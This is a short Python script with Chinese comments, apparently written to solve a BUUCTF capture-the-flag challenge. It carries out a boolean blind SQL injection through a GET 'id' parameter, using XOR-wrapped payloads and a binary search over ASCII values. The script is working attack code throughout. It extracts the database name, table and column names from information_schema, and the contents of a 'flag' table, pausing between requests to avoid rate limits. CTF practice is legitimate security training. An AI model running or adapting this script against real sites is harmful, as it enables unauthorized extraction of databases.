# 二分法sql盲注GET传参
import requests
import time

host = 'http://8e76b4a0-0c4a-4828-8ef6-7a6c3bfb012a.node3.buuoj.cn/index.php?id='

ans=''
for i in range(1,1000):
    low = 32
    high = 128
    mid = (low+high)//2
    while low < high:
        # 拿库
        url1 = host + "1^(ascii(substr((select(database())),%d,1))<%d)^1"%(i,mid)
        # 拿表
        url2 = host + "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),%d,1))<%d)^1" %(i,mid)
        # 拿字段
        url3 = host + "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),%d,1))<%d)^1" % (i,mid)
        # 拿数据
        url4 = host + "1^(ascii(substr((select(group_concat(value))from(flag)),%d,1))<%d)^1" %(i,mid)
        res = requests.get(url1)
        if "Nu1L" in res.text: # 1^1^1
            high = mid
        else:
            low = mid+1
        mid=(low+high)//2
        # 延时防止429
        time.sleep(1)
    if mid <= 32 or mid >= 127:
        break
    ans += chr(mid-1)
    print(ans)


